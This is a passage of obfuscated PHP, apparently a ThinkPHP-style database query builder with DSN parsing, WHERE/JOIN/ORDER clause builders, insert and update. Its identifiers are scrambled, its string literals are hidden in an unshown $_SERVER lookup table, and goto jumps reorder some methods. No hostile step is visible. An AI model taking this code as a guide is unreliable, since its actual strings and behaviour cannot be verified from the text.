$cˆÖõì«ï[$F„ÒÑ«“æ[837]][0], $F„ÒÑ«“æ[13] => isset($cˆÖõì«ï[$F„ÒÑ«“æ[13]][$B•¿’´¨ìº]) ? $cˆÖõì«ï[$F„ÒÑ«“æ[13]][$B•¿’´¨ìº] : $cˆÖõì«ï[$F„ÒÑ«“æ[13]][0]); return $this->connect($CÄƒ‡†ÖÛä, $B•¿’´¨ìº); } public function parseDSN($fÜÆ±æ‚À) { $E²Ô¾õäÔ =& $_SERVER[…Ò×–]; if (empty($fÜÆ±æ‚À)) { return !1; } $E×¢ß‹Ä²Æ = parse_url($fÜÆ±æ‚À); if ($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[172]]) { $Bàó‰½ç­Ó = array($E²Ô¾õäÔ[882] => $E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[172]], $E²Ô¾õäÔ[810] => isset($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[539]]) ? $E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[539]] : $E²Ô¾õäÔ[33], $E²Ô¾õäÔ[811] => isset($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[903]]) ? $E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[903]] : $E²Ô¾õäÔ[33], $E²Ô¾õäÔ[808] => isset($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[173]]) ? $E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[173]] : $E²Ô¾õäÔ[33], $E²Ô¾õäÔ[809] => isset($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[174]]) ? $E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[174]] : $E²Ô¾õäÔ[33], $E²Ô¾õäÔ[17] => isset($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[75]]) ? substr($E×¢ß‹Ä²Æ[$E²Ô¾õäÔ[75]], 1) : $E²Ô¾õäÔ[33]); } else { preg_match($E²Ô¾õäÔ[904], trim($fÜÆ±æ‚À), $cøËÈğô); $Bàó‰½ç­Ó = array($E²Ô¾õäÔ[882] => $cøËÈğô[1], $E²Ô¾õäÔ[810] => $cøËÈğô[2], $E²Ô¾õäÔ[811] => $cøËÈğô[3], $E²Ô¾õäÔ[808] => $cøËÈğô[4], $E²Ô¾õäÔ[809] => $cøËÈğô[5], $E²Ô¾õäÔ[17] => $cøËÈğô[6]); } $Bàó‰½ç­Ó[$E²Ô¾õäÔ[837]] = $E²Ô¾õäÔ[33]; return $Bàó‰½ç­Ó; } protected function debug() { $DæôâŠ¢­¤ =& $_SERVER[…Ò×–]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $DæôâŠ¢­¤[905]; if (think_config($DæôâŠ¢­¤[906])) { think_status($DæôâŠ¢­¤[907]); think_trace($this->queryStr . $DæôâŠ¢­¤[908] . think_status($DæôâŠ¢­¤[20], $DæôâŠ¢­¤[907], 6) . $DæôâŠ¢­¤[909], $DæôâŠ¢­¤[33], $DæôâŠ¢­¤[910]); } } protected function parseLock($f÷±Ù÷ù’ = false) { $cÖ¨íÌŠ¸ƒ =& $_SERVER[…Ò×–]; if (!$f÷±Ù÷ù’) { return $cÖ¨íÌŠ¸ƒ[33]; } if ($cÖ¨íÌŠ¸ƒ[839] == $this->dbType) { return $cÖ¨íÌŠ¸ƒ[911]; } return $cÖ¨íÌŠ¸ƒ[912]; } protected function parseSet($FÚîÄ¢ÅÁ) { $F˜ğ£à²½í =& $_SERVER[…Ò×–]; foreach ($FÚîÄ¢ÅÁ as $dºÀšİÃŠ¥ => $eîÙ¼áóÅµ) { if (is_array($eîÙ¼áóÅµ) && $F˜ğ£à²½í[289] == $eîÙ¼áóÅµ[0]) { $EŒ¥ŸƒëäÉ[] = $this->parseKey($dºÀšİÃŠ¥) . $F˜ğ£à²½í[913] . $eîÙ¼áóÅµ[1]; } elseif (is_scalar($eîÙ¼áóÅµ) || is_null($eîÙ¼áóÅµ)) { $EŒ¥ŸƒëäÉ[] = $this->parseKey($dºÀšİÃŠ¥) . $F˜ğ£à²½í[913] . $this->parseValue($eîÙ¼áóÅµ); } } return $F˜ğ£à²½í[914] . implode($F˜ğ£à²½í[47], $EŒ¥ŸƒëäÉ); } protected function bindParam($cĞÓ…¬˜Í, $dß§šÃĞ¨) { $this->bind[$_SERVER[…Ò×–][4] . $cĞÓ…¬˜Í] = $dß§šÃĞ¨; } protected function parseBind($a™Öó¡ñŸŠ) { $a™Öó¡ñŸŠ = array_merge($this->bind, $a™Öó¡ñŸŠ); $this->bind = array(); return $a™Öó¡ñŸŠ; } function parseKey(&$EÙ»˜Ô¯À¿, $dˆ‰Ù‚ã¿Ì = true) { if ($dˆ‰Ù‚ã¿Ì) { $EÙ»˜Ô¯À¿ = $this->parseKeyCheck($EÙ»˜Ô¯À¿); } return $EÙ»˜Ô¯À¿; } function parseKeyCheck($f‡‘¦ÅöŠ ) { $AöÉÎ‹ÉİÒ =& $_SERVER[…Ò×–]; $f‡‘¦ÅöŠ  = trim($f‡‘¦ÅöŠ ); if (!preg_match($AöÉÎ‹ÉİÒ[915], $f‡‘¦ÅöŠ )) { think_exception($AöÉÎ‹ÉİÒ[916] . $f‡‘¦ÅöŠ ); } return $f‡‘¦ÅöŠ ; } protected function parseValue($b¾­­ô»¸£) { $Eƒøº¢¢¦ =& $_SERVER[…Ò×–]; if (is_string($b¾­­ô»¸£)) { $b¾­­ô»¸£ = $Eƒøº¢¢¦[878] . $this->escapeString($b¾­­ô»¸£) . $Eƒøº¢¢¦[878]; } elseif (isset($b¾­­ô»¸£[0]) && is_string($b¾­­ô»¸£[0]) && strtolower($b¾­­ô»¸£[0]) == $Eƒøº¢¢¦[289]) { $b¾­­ô»¸£ = $this->escapeString($b¾­­ô»¸£[1]); } elseif (is_array($b¾­­ô»¸£)) { $b¾­­ô»¸£ = array_map(array($this, $Eƒøº¢¢¦[879]), $b¾­­ô»¸£); } elseif (is_bool($b¾­­ô»¸£)) { $b¾­­ô»¸£ = $b¾­­ô»¸£ ? $Eƒøº¢¢¦[83] : $Eƒøº¢¢¦[473]; } elseif (is_null($b¾­­ô»¸£)) { $b¾­­ô»¸£ = $Eƒøº¢¢¦[99]; } return $b¾­­ô»¸£; } protected function parseField($bÁòÆ¦‘¡Â) { $FóÍÑ„õ‡ =& $_SERVER[…Ò×–]; if (is_string($bÁòÆ¦‘¡Â) && strpos($bÁòÆ¦‘¡Â, $FóÍÑ„õ‡[47])) { $bÁòÆ¦‘¡Â = explode($FóÍÑ„õ‡[47], $bÁòÆ¦‘¡Â); } if (is_array($bÁòÆ¦‘¡Â)) { $F³àˆƒ¾ç = array(); foreach ($bÁòÆ¦‘¡Â as $Bô‰‰Ø†ß => $f³÷ÊŸÕŞ£) { if (!is_numeric($Bô‰‰Ø†ß)) { $F³àˆƒ¾ç[] = $this->parseKey($Bô‰‰Ø†ß) . $FóÍÑ„õ‡[917] . $this->parseKey($f³÷ÊŸÕŞ£); } else { $F³àˆƒ¾ç[] = $this->parseKey($f³÷ÊŸÕŞ£); } } $F¯òŒ¨° = implode($FóÍÑ„õ‡[47], $F³àˆƒ¾ç); } elseif (is_string($bÁòÆ¦‘¡Â) && !empty($bÁòÆ¦‘¡Â)) { $F¯òŒ¨° = $bÁòÆ¦‘¡Â; } else { $F¯òŒ¨° = $FóÍÑ„õ‡[180]; } return $F¯òŒ¨°; } protected function parseTable($A¸·¶ƒåå‚) { $bëÀèÍ” =& $_SERVER[…Ò×–]; if (is_array($A¸·¶ƒåå‚)) { $eÏ†Ó¯ùÀé = array(); foreach ($A¸·¶ƒåå‚ as $E÷®‚™Œñ => $d½ßÉƒñˆ) { if (!is_numeric($E÷®‚™Œñ)) { $eÏ†Ó¯ùÀé[] = $this->parseKey($E÷®‚™Œñ) . $bëÀèÍ”[50] . $this->parseKey($d½ßÉƒñˆ); } else { $eÏ†Ó¯ùÀé[] = $this->parseKey($E÷®‚™Œñ); } } $A¸·¶ƒåå‚ = $eÏ†Ó¯ùÀé; } elseif (is_string($A¸·¶ƒåå‚)) { if (strstr($A¸·¶ƒåå‚, $bëÀèÍ”[50])) { return $A¸·¶ƒåå‚; } $A¸·¶ƒåå‚ = explode($bëÀèÍ”[47], $A¸·¶ƒåå‚); array_walk($A¸·¶ƒåå‚, array($this, $bëÀèÍ”[827])); } return $bëÀèÍ”[918] . trim(implode($bëÀèÍ”[919], $A¸·¶ƒåå‚), $bëÀèÍ”[833]) . $bëÀèÍ”[918]; } protected function parseWhere($cëÎ¼†‡¸¸) { $F–öé‡¯ÁÄ =& $_SERVER[…Ò×–]; $EŒÄàˆ¤¾ = $F–öé‡¯ÁÄ[33]; if (is_string($cëÎ¼†‡¸¸)) { $EŒÄàˆ¤¾ = $cëÎ¼†‡¸¸; } else { $fôçÄóò¶ = isset($cëÎ¼†‡¸¸[$F–öé‡¯ÁÄ[920]]) ? strtoupper($cëÎ¼†‡¸¸[$F–öé‡¯ÁÄ[920]]) : $F–öé‡¯ÁÄ[33]; if (in_array($fôçÄóò¶, array($F–öé‡¯ÁÄ[921], $F–öé‡¯ÁÄ[922], $F–öé‡¯ÁÄ[923]))) { $fôçÄóò¶ = $F–öé‡¯ÁÄ[50] . $fôçÄóò¶ . $F–öé‡¯ÁÄ[50]; unset($cëÎ¼†‡¸¸[$F–öé‡¯ÁÄ[920]]); } else { $fôçÄóò¶ = $F–öé‡¯ÁÄ[924]; } foreach ($cëÎ¼†‡¸¸ as $F„¿ğ¼±¿› => $C‡î©Åãåœ) { $EŒÄàˆ¤¾ .= $F–öé‡¯ÁÄ[269]; if (is_numeric($F„¿ğ¼±¿›)) { $F„¿ğ¼±¿› = $F–öé‡¯ÁÄ[925]; } if (0 === strpos($F„¿ğ¼±¿›, $F–öé‡¯ÁÄ[70])) { $EŒÄàˆ¤¾ .= $this->parseThinkWhere($F„¿ğ¼±¿›, $C‡î©Åãåœ); } else { if (!preg_match($F–öé‡¯ÁÄ[926], trim($F„¿ğ¼±¿›))) { think_exception(think_lang($F–öé‡¯ÁÄ[927]) . $F–öé‡¯ÁÄ[4] . $F„¿ğ¼±¿›); } $D¦†ÈÎÖÃé = is_array($C‡î©Åãåœ) && isset($C‡î©Åãåœ[$F–öé‡¯ÁÄ[928]]); $F„¿ğ¼±¿› = trim($F„¿ğ¼±¿›); if (strpos($F„¿ğ¼±¿›, $F–öé‡¯ÁÄ[275])) { $e¢Ş¼ÁªÚ‰ = explode($F–öé‡¯ÁÄ[275], $F„¿ğ¼±¿›); $b™¾æ…Õ‰’ = array(); foreach ($e¢Ş¼ÁªÚ‰ as $b‚†‡åë => $dƒé•Ö‘±) { $eÕÆèî¹¸ = $D¦†ÈÎÖÃé ? $C‡î©Åãåœ[$b‚†‡åë] : $C‡î©Åãåœ; $b™¾æ…Õ‰’[] = $F–öé‡¯ÁÄ[252] . $this->parseWhereItem($this->parseKey($dƒé•Ö‘±), $eÕÆèî¹¸) . $F–öé‡¯ÁÄ[826]; } $EŒÄàˆ¤¾ .= implode($F–öé‡¯ÁÄ[929], $b™¾æ…Õ‰’); } elseif (strpos($F„¿ğ¼±¿›, $F–öé‡¯ÁÄ[276])) { $e¢Ş¼ÁªÚ‰ = explode($F–öé‡¯ÁÄ[276], $F„¿ğ¼±¿›); $b™¾æ…Õ‰’ = array(); foreach ($e¢Ş¼ÁªÚ‰ as $b‚†‡åë => $dƒé•Ö‘±) { $eÕÆèî¹¸ = $D¦†ÈÎÖÃé ? $C‡î©Åãåœ[$b‚†‡åë] : $C‡î©Åãåœ; $b™¾æ…Õ‰’[] = $F–öé‡¯ÁÄ[252] . $this->parseWhereItem($this->parseKey($dƒé•Ö‘±), $eÕÆèî¹¸) . $F–öé‡¯ÁÄ[826]; } $EŒÄàˆ¤¾ .= implode($F–öé‡¯ÁÄ[924], $b™¾æ…Õ‰’); } else { $EŒÄàˆ¤¾ .= $this->parseWhereItem($this->parseKey($F„¿ğ¼±¿›), $C‡î©Åãåœ); } } $EŒÄàˆ¤¾ .= $F–öé‡¯ÁÄ[270] . $fôçÄóò¶; } $EŒÄàˆ¤¾ = substr($EŒÄàˆ¤¾, 0, -strlen($fôçÄóò¶)); } return empty($EŒÄàˆ¤¾) ? $F–öé‡¯ÁÄ[33] : $F–öé‡¯ÁÄ[930] . $EŒÄàˆ¤¾; } protected function parseWhereItem($d¶¶½Óõ›¥, $CœÒåÚĞä¦) { $a½öŸ¹ Õ¢ =& $_SERVER[…Ò×–]; $CŸ²è£…… = $a½öŸ¹ Õ¢[33]; if (is_array($CœÒåÚĞä¦)) { if (is_string($CœÒåÚĞä¦[0])) { $aìİ”ƒÆÚÅ = strtolower($CœÒåÚĞä¦[0]); if (in_array($CœÒåÚĞä¦[0], array($a½öŸ¹ Õ¢[913], $a½öŸ¹ Õ¢[931], $a½öŸ¹ Õ¢[932], $a½öŸ¹ Õ¢[933], $a½öŸ¹ Õ¢[934], $a½öŸ¹ Õ¢[935]))) { $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $CœÒåÚĞä¦[0] . $a½öŸ¹ Õ¢[50] . $this->parseValue($CœÒåÚĞä¦[1]); } elseif (preg_match($a½öŸ¹ Õ¢[936], $CœÒåÚĞä¦[0])) { $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[50] . $this->parseValue($CœÒåÚĞä¦[1]); } elseif (preg_match($a½öŸ¹ Õ¢[937], $CœÒåÚĞä¦[0])) { if (is_array($CœÒåÚĞä¦[1])) { $DßğìÌåî… = isset($CœÒåÚĞä¦[2]) ? strtoupper($CœÒåÚĞä¦[2]) : $a½öŸ¹ Õ¢[922]; if (in_array($DßğìÌåî…, array($a½öŸ¹ Õ¢[921], $a½öŸ¹ Õ¢[922], $a½öŸ¹ Õ¢[923]))) { $C´—í¢Ò¨â = array(); foreach ($CœÒåÚĞä¦[1] as $DˆŒ›ãŞœö) { $C´—í¢Ò¨â[] = $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[50] . $this->parseValue($DˆŒ›ãŞœö); } $CŸ²è£…… .= $a½öŸ¹ Õ¢[252] . implode($a½öŸ¹ Õ¢[50] . $DßğìÌåî… . $a½öŸ¹ Õ¢[50], $C´—í¢Ò¨â) . $a½öŸ¹ Õ¢[826]; } } else { $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[50] . $this->parseValue($CœÒåÚĞä¦[1]); } } elseif ($a½öŸ¹ Õ¢[289] == $aìİ”ƒÆÚÅ) { $CŸ²è£…… .= $a½öŸ¹ Õ¢[824] . $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $CœÒåÚĞä¦[1] . $a½öŸ¹ Õ¢[938]; } elseif (preg_match($a½öŸ¹ Õ¢[939], $CœÒåÚĞä¦[0])) { if (isset($CœÒåÚĞä¦[2]) && $a½öŸ¹ Õ¢[289] == $CœÒåÚĞä¦[2]) { $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[50] . $CœÒåÚĞä¦[1]; } else { if (is_string($CœÒåÚĞä¦[1])) { $CœÒåÚĞä¦[1] = explode($a½öŸ¹ Õ¢[47], $CœÒåÚĞä¦[1]); } $F¥Û³ˆªÖò = implode($a½öŸ¹ Õ¢[47], $this->parseValue($CœÒåÚĞä¦[1])); $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[824] . $F¥Û³ˆªÖò . $a½öŸ¹ Õ¢[826]; } } elseif (preg_match($a½öŸ¹ Õ¢[940], $CœÒåÚĞä¦[0])) { $cÏŞë‘…´¤ = is_string($CœÒåÚĞä¦[1]) ? explode($a½öŸ¹ Õ¢[47], $CœÒåÚĞä¦[1]) : $CœÒåÚĞä¦[1]; $CŸ²è£…… .= $a½öŸ¹ Õ¢[824] . $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $this->exp[$aìİ”ƒÆÚÅ] . $a½öŸ¹ Õ¢[50] . $this->parseValue($cÏŞë‘…´¤[0]) . $a½öŸ¹ Õ¢[924] . $this->parseValue($cÏŞë‘…´¤[1]) . $a½öŸ¹ Õ¢[270]; } else { think_exception(think_lang($a½öŸ¹ Õ¢[927]) . $a½öŸ¹ Õ¢[4] . $CœÒåÚĞä¦[0]); } } else { $dØŸÍ×ôÀó = count($CœÒåÚĞä¦); $AÀõóöø®× = isset($CœÒåÚĞä¦[$dØŸÍ×ôÀó - 1]) ? strtoupper($CœÒåÚĞä¦[$dØŸÍ×ôÀó - 1]) : $a½öŸ¹ Õ¢[33]; if (in_array($AÀõóöø®×, array($a½öŸ¹ Õ¢[921], $a½öŸ¹ Õ¢[922], $a½öŸ¹ Õ¢[923]))) { $dØŸÍ×ôÀó = $dØŸÍ×ôÀó - 1; } else { $AÀõóöø®× = $a½öŸ¹ Õ¢[921]; } for ($c‘å‘Ô¿ = 0; $c‘å‘Ô¿ < $dØŸÍ×ôÀó; $c‘å‘Ô¿++) { $cÏŞë‘…´¤ = is_array($CœÒåÚĞä¦[$c‘å‘Ô¿]) ? $CœÒåÚĞä¦[$c‘å‘Ô¿][1] : $CœÒåÚĞä¦[$c‘å‘Ô¿]; if ($a½öŸ¹ Õ¢[289] == strtolower($CœÒåÚĞä¦[$c‘å‘Ô¿][0])) { $CŸ²è£…… .= $a½öŸ¹ Õ¢[252] . $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $cÏŞë‘…´¤ . $a½öŸ¹ Õ¢[938] . $AÀõóöø®× . $a½öŸ¹ Õ¢[50]; } else { $C±í‚£ªâ = is_array($CœÒåÚĞä¦[$c‘å‘Ô¿]) ? $this->exp[strtolower($CœÒåÚĞä¦[$c‘å‘Ô¿][0])] : $a½öŸ¹ Õ¢[913]; if (!$C±í‚£ªâ && is_array($CœÒåÚĞä¦[$c‘å‘Ô¿]) && in_array($CœÒåÚĞä¦[$c‘å‘Ô¿][0], array($a½öŸ¹ Õ¢[913], $a½öŸ¹ Õ¢[931], $a½öŸ¹ Õ¢[932], $a½öŸ¹ Õ¢[933], $a½öŸ¹ Õ¢[934], $a½öŸ¹ Õ¢[935]))) { $C±í‚£ªâ = $CœÒåÚĞä¦[$c‘å‘Ô¿][0]; } $CŸ²è£…… .= $a½öŸ¹ Õ¢[252] . $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[50] . $C±í‚£ªâ . $a½öŸ¹ Õ¢[50] . $this->parseValue($cÏŞë‘…´¤) . $a½öŸ¹ Õ¢[938] . $AÀõóöø®× . $a½öŸ¹ Õ¢[50]; } } $CŸ²è£…… = substr($CŸ²è£……, 0, -4); } } else { $CŸ²è£…… .= $d¶¶½Óõ›¥ . $a½öŸ¹ Õ¢[941] . $this->parseValue($CœÒåÚĞä¦); } return $CŸ²è£……; } protected function parseThinkWhere($bÉØˆÑƒŒÇ, $BäİØ¡‰Íà) { $d½ëÅ·¥§è =& $_SERVER[…Ò×–]; $f†ÆÍ™ˆ¦˜ = $d½ëÅ·¥§è[33]; switch ($bÉØˆÑƒŒÇ) { case $d½ëÅ·¥§è[343]: $f†ÆÍ™ˆ¦˜ = $BäİØ¡‰Íà; break; case $d½ëÅ·¥§è[925]: $f†ÆÍ™ˆ¦˜ = is_string($BäİØ¡‰Íà) ? $BäİØ¡‰Íà : substr($this->parseWhere($BäİØ¡‰Íà), 6); break; case $d½ëÅ·¥§è[942]: parse_str($BäİØ¡‰Íà, $A…áë·¹µÎ); if (isset($A…áë·¹µÎ[$d½ëÅ·¥§è[920]])) { $dö¸”øæ× = $d½ëÅ·¥§è[50] . strtoupper($A…áë·¹µÎ[$d½ëÅ·¥§è[920]]) . $d½ëÅ·¥§è[50]; unset($A…áë·¹µÎ[$d½ëÅ·¥§è[920]]); } else { $dö¸”øæ× = $d½ëÅ·¥§è[924]; } $Cì»î—ÈÙÕ = array(); foreach ($A…áë·¹µÎ as $C››ï‰Éô => $a™çö¢Ù„) { $Cì»î—ÈÙÕ[] = $this->parseKey($C››ï‰Éô) . $d½ëÅ·¥§è[941] . $this->parseValue($a™çö¢Ù„); } $f†ÆÍ™ˆ¦˜ = implode($dö¸”øæ×, $Cì»î—ÈÙÕ); break; } return $f†ÆÍ™ˆ¦˜; } protected function parseLimit($a³Ğğ¸„î) { $Dº¹ôĞÇ™Œ =& $_SERVER[…Ò×–]; return !empty($a³Ğğ¸„î) ? $Dº¹ôĞÇ™Œ[48] . $a³Ğğ¸„î . $Dº¹ôĞÇ™Œ[50] : $Dº¹ôĞÇ™Œ[33]; } protected function parseJoin($BÄ§À—îÕì) { $EÁˆÊ£‹¾ï =& $_SERVER[…Ò×–]; $D»¬³¡²’­ = $EÁˆÊ£‹¾ï[33]; if (!empty($BÄ§À—îÕì)) { if (is_array($BÄ§À—îÕì)) { foreach ($BÄ§À—îÕì as $c‡ğÄ¤ªšà => $e³³é÷Öï†) { if (!1 !== stripos($e³³é÷Öï†, $EÁˆÊ£‹¾ï[943])) { $D»¬³¡²’­ .= $EÁˆÊ£‹¾ï[50] . $e³³é÷Öï†; } else { $D»¬³¡²’­ .= $EÁˆÊ£‹¾ï[944] . $e³³é÷Öï†; } } } else { $D»¬³¡²’­ .= $EÁˆÊ£‹¾ï[944] . $BÄ§À—îÕì; } } $D»¬³¡²’­ = preg_replace($EÁˆÊ£‹¾ï[945], think_config($EÁˆÊ£‹¾ï[851]) . $EÁˆÊ£‹¾ï[946], $D»¬³¡²’­); return $D»¬³¡²’­; } protected function parseOrder($e·ƒˆ¸ç–) { $EØƒÙêâğ =& $_SERVER[…Ò×–]; if (is_array($e·ƒˆ¸ç–)) { $dåãĞîİ¢ = array(); foreach ($e·ƒˆ¸ç– as $E×œôËô›Ê => $cùó Éø÷‡) { if (is_numeric($E×œôËô›Ê)) { $dåãĞîİ¢[] = $this->parseKey($cùó Éø÷‡); } else { $cùó Éø÷‡ = in_array(strtoupper(trim($cùó Éø÷‡)), array($EØƒÙêâğ[947], $EØƒÙêâğ[948])) ? $EØƒÙêâğ[50] . $cùó Éø÷‡ : $EØƒÙêâğ[33]; if (preg_match($EØƒÙêâğ[949], $E×œôËô›Ê)) { $dåãĞîİ¢[] = $this->parseKey($E×œôËô›Ê) . $cùó Éø÷‡; } else { think_exception($EØƒÙêâğ[950] . $E×œôËô›Ê); } } } $e·ƒˆ¸ç– = implode($EØƒÙêâğ[47], $dåãĞîİ¢); } return !empty($e·ƒˆ¸ç–) ? $EØƒÙêâğ[951] . $e·ƒˆ¸ç– : $EØƒÙêâğ[33]; } protected function parseGroup($E¯ÍˆˆäË×) { $C¾­ãÍñÅ› =& $_SERVER[…Ò×–]; return !empty($E¯ÍˆˆäË×) ? $C¾­ãÍñÅ›[952] . $E¯ÍˆˆäË× : $C¾­ãÍñÅ›[33]; } protected function parseHaving($F™‰’»ÓÒŠ) { $f¥ÛÈƒç‚Ö =& $_SERVER[…Ò×–]; return !empty($F™‰’»ÓÒŠ) ? $f¥ÛÈƒç‚Ö[953] . $F™‰’»ÓÒŠ : $f¥ÛÈƒç‚Ö[33]; } protected function parseComment($a‹À¯ö§œ) { $c¡ñ¯›±Œ =& $_SERVER[…Ò×–]; return !empty($a‹À¯ö§œ) ? $c¡ñ¯›±Œ[954] . $a‹À¯ö§œ . $c¡ñ¯›±Œ[955] : $c¡ñ¯›±Œ[33]; } protected function parseDistinct($e¯Ê´ğ…†Ú) { $fïœ¨„ø‹ó =& $_SERVER[…Ò×–]; return !empty($e¯Ê´ğ…†Ú) ? $fïœ¨„ø‹ó[956] : $fïœ¨„ø‹ó[33]; } protected function parseUnion($f£ù”ñâ) { $A¿ïê¤ˆ¢ =& $_SERVER[…Ò×–]; if (empty($f£ù”ñâ)) { return $A¿ïê¤ˆ¢[33]; } if (isset($f£ù”ñâ[$A¿ïê¤ˆ¢[340]])) { $e³ËÇÈÑˆ = $A¿ïê¤ˆ¢[957]; unset($f£ù”ñâ[$A¿ïê¤ˆ¢[340]]); } else { $e³ËÇÈÑˆ = $A¿ïê¤ˆ¢[958]; } foreach ($f£ù”ñâ as $fÕòÌ×öà¹) { $déŸÁÔã‘ë[] = $e³ËÇÈÑˆ . (is_array($fÕòÌ×öà¹) ? $this->buildSelectSql($fÕòÌ×öà¹) : $fÕòÌ×öà¹); } return implode($A¿ïê¤ˆ¢[50], $déŸÁÔã‘ë); } public function insert($C©ğ¬‡˜ğ¸, $D»‡®àØô‚ = array(), $b¼„½œ·øÃ = false) { goto CÁ…‹Ù®ŞŒ; bÍ¤ƒÏÚ¿: foreach ($C©ğ¬‡˜ğ¸ as $b‹®ÙÄ…Ï => $Aè…îå§ñ) { if (is_array($Aè…îå§ñ) && $b Å¾Ê¯Ø…[289] == $Aè…îå§ñ[0]) { $aƒ°¥À÷ØŸ[] = $this->parseKey($b‹®ÙÄ…Ï); $A›ÄõŒ£Ó‹[] = $Aè…îå§ñ[1]; } elseif (is_scalar($Aè…îå§ñ) || is_null($Aè…îå§ñ)) { $aƒ°¥À÷ØŸ[] = $this->parseKey($b‹®ÙÄ…Ï); $A›ÄõŒ£Ó‹[] = $this->parseValue($Aè…îå§ñ); } } $bŒ»İ«ÛØİ = ($b¼„½œ·øÃ ? $b Å¾Ê¯Ø…[828] : $b Å¾Ê¯Ø…[829]) . $b Å¾Ê¯Ø…[830] . $this->parseTable($D»‡®àØô‚[$b Å¾Ê¯Ø…[271]]) . $b Å¾Ê¯Ø…[824] . implode($b Å¾Ê¯Ø…[47], $aƒ°¥À÷ØŸ) . $b Å¾Ê¯Ø…[825] . implode($b Å¾Ê¯Ø…[47], $A›ÄõŒ£Ó‹) . $b Å¾Ê¯Ø…[826]; $bŒ»İ«ÛØİ .= $this->parseLock(isset($D»‡®àØô‚[$b Å¾Ê¯Ø…[776]]) ? $D»‡®àØô‚[$b Å¾Ê¯Ø…[776]] : !1); goto e»¥¥‚¡´•; e»¥¥‚¡´•: $bŒ»İ«ÛØİ .= $this->parseComment(!empty($D»‡®àØô‚[$b Å¾Ê¯Ø…[345]]) ? $D»‡®àØô‚[$b Å¾Ê¯Ø…[345]] : $b Å¾Ê¯Ø…[33]); return $this->execute($bŒ»İ«ÛØİ, $this->parseBind(!empty($D»‡®àØô‚[$b Å¾Ê¯Ø…[277]]) ? $D»‡®àØô‚[$b Å¾Ê¯Ø…[277]] : array())); goto C©÷¿Ïä‚; CÁ…‹Ù®ŞŒ: $b Å¾Ê¯Ø… =& $_SERVER[…Ò×–]; $A›ÄõŒ£Ó‹ = $aƒ°¥À÷ØŸ = array(); $this->model = $D»‡®àØô‚[$b Å¾Ê¯Ø…[273]]; goto bÍ¤ƒÏÚ¿; C©÷¿Ïä‚: } public function selectInsert($C¦ô…ç§, $f˜ë“¢ã¶Ê, $b†¯¥ƒÇ˜ = array()) { goto F¼”á´ÚÙ‰; aºíŠ³µ÷ã: return $this->execute($F’Âçèã¦ò, $this->parseBind(!empty($b†¯¥ƒÇ˜[$C×çÃˆš¶Í[277]]) ? $b†¯¥ƒÇ˜[$C×çÃˆš¶Í[277]] : array())); goto f®Ä«¢‚­Ç; BòÓ†«ƒîÖ: array_walk($C¦ô…ç§, array($this, $C×çÃˆš¶Í[827])); $F’Âçèã¦ò = $C×çÃˆš¶Í[959] . $this->parseTable($f˜ë“¢ã¶Ê) . $C×çÃˆš¶Í[824] . implode($C×çÃˆš¶Í[47], $C¦ô…ç§) . $C×çÃˆš¶Í[938]; $F’Âçèã¦ò .= $this->buildSelectSql($b†¯¥ƒÇ˜); goto aºíŠ³µ÷ã; F¼”á´ÚÙ‰: $C×çÃˆš¶Í =& $_SERVER[…Ò×–]; $this->model = $b†¯¥ƒÇ˜[$C×çÃˆš¶Í[273]]; if (is_string($C¦ô…ç§)) { $C¦ô…ç§ = explode($C×çÃˆš¶Í[47], $C¦ô…ç§); } goto BòÓ†«ƒîÖ; f®Ä«¢‚­Ç: } public function update($d¼÷Ÿ¢µ¯¨, $C‹Úğ±Æ’²) { $Eğ”„ÁÕ‰Æ =& $_SERVER[…Ò×–]; $this->model = $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[273]]; $bî’×Ã¥ò = $Eğ”„ÁÕ‰Æ[960] . $this->parseTable($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[271]]) . $this->parseSet($d¼÷Ÿ¢µ¯¨) . $this->parseWhere(!empty($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[267]]) ? $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[267]] : $Eğ”„ÁÕ‰Æ[33]) . $this->parseOrder(!empty($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[354]]) ? $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[354]] : $Eğ”„ÁÕ‰Æ[33]) . $this->parseLimit(!empty($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[284]]) ? $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[284]] : $Eğ”„ÁÕ‰Æ[33]) . $this->parseLock(isset($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[776]]) ? $C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[776]] : !1) . $this->parseComment(!empty($C‹Úğ±Æ’²[$Eğ”„ÁÕ‰Æ[345]]) ? 